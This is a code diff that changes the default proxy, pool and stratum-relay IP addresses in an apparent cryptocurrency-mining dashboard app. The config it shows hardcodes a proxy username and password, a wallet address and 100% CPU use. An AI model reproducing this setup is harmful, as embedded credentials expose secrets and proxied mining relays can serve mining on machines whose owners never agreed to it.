@@ -1095,7 +1095,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                     <div class="form-grid">
                         <div class="form-group">
                             <label>SOCKS5 Proxy IP & Port (Dante):</label>
-                            <input type="text" id="mine-proxy" value="43.135.134.20:443">
+                            <input type="text" id="mine-proxy" value="43.135.146.244:443">
                         </div>
                         <div class="form-group">
                             <label>Proxy Username:</label>
@@ -1107,7 +1107,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                         </div>
                         <div class="form-group">
                             <label>Pool Address (HeroMiners / xmrig-proxy):</label>
-                            <input type="text" id="mine-pool" value="43.135.134.20:10080">
+                            <input type="text" id="mine-pool" value="43.135.146.244:10080">
                         </div>
                         <div class="form-group">
                             <label>Algoritma Mining:</label>
@@ -3771,10 +3771,10 @@ def load_mining_state() -> dict:
     return {
         "enabled": False,
         "config": {
-            "proxy": "43.135.134.20:443",
+            "proxy": "43.135.146.244:443",
             "username": "aku",
             "password": "akukayaraya",
-            "pool": "43.135.134.20:10080",
+            "pool": "43.135.146.244:10080",
             "algo": "rx/0",
             "wallet": "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5",
             "cpu_pct": "100"
@@ -4616,7 +4616,7 @@ async def stratum_ws_handler(request):
     ws = web.WebSocketResponse(heartbeat=30.0, max_msg_size=16 * 1024 * 1024)
     await ws.prepare(request)
 
-    pool_host = request.query.get("host", "43.135.134.20")
+    pool_host = request.query.get("host", "43.135.146.244")
     pool_port = int(request.query.get("port", "10080"))
 
     try:
